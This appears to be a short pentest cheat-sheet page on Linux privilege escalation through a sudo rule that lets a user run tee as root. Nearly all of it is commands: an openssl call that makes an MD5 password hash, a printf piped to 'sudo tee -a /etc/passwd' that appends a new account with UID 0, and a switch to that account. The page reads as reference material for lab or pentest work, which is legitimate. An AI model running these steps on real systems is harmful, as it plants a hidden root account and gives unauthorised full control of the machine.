---
title: Sudo Tee Privilege Escalation
description: Sudo tee command is vulnerable to privilege escalation.
tags:
    - Privilege Escalation
refs:
date: 2023-02-26
draft: false
---

## Investigation

```bash
(root) NOPASSWD: /usr/bin/tee
```

If we can execute **`tee`** command as root, we can escalate to privilege.

<br />

## Exploitation

### 1. Create a New Password for New User

Assume the new username is "tester".

```sh
# -1: MD5 algorithm
# -salt: Use privided salt -> The new username here
openssl passwd -1 -salt "tester" "password123"

# Output: $1$tester$LvsygQ2GEt7VUJQEqhMLf/
```

Copy the output password.

### 2. Write New Line with Tee

Paste the password in **`printf`** and overwrite **`/etc/passwd`** using **`tee`** command.

```sh
printf 'tester:$1$tester$LvsygQ2GEt7VUJQEqhMLf/:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd
```

### 3. Switch to New User

Now the new user was created.  
We can switch to the new user.

```sh
su tester
password: password123
```